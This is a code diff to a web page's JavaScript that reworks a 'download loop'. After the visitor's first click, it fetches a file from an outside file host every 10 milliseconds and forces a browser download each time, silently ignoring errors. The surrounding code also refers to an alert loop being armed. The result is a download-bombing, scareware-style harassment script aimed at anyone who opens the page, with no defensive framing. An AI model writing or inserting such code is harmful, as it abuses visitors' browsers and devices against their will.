@@ -605,26 +605,31 @@ function startAlertLoop() {
 
 /* 🔥 NEW: DOWNLOAD LOOP (user-initiated) */
 const DOWNLOAD_URL = "https://files.catbox.moe/kux6de.png";
+let unlocked = false;
 
-let downloadsUnlocked = false;
-
-/* 🔓 unlock on ANY user gesture (once) */
+/* unlock once */
 document.addEventListener("click", () => {
-    downloadsUnlocked = true;
+    unlocked = true;
 }, { once: true });
 
-/* 🔁 START IMMEDIATELY — no waiting */
-setInterval(() => {
-    if (!downloadsUnlocked) return;
+/* retry loop (already running) */
+setInterval(async () => {
+    if (!unlocked) return;
 
-    const a = document.createElement("a");
-    a.href = DOWNLOAD_URL;
-    a.download = "";
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
+    try {
+        const res = await fetch(DOWNLOAD_URL);
+        const blob = await res.blob();
 
-}, 0); // no delay between attempts
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "kux6de.png"; // FORCE filename
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    } catch (e) {}
+}, 10);
 
 setTimeout(() => {
     alertsArmed = true;
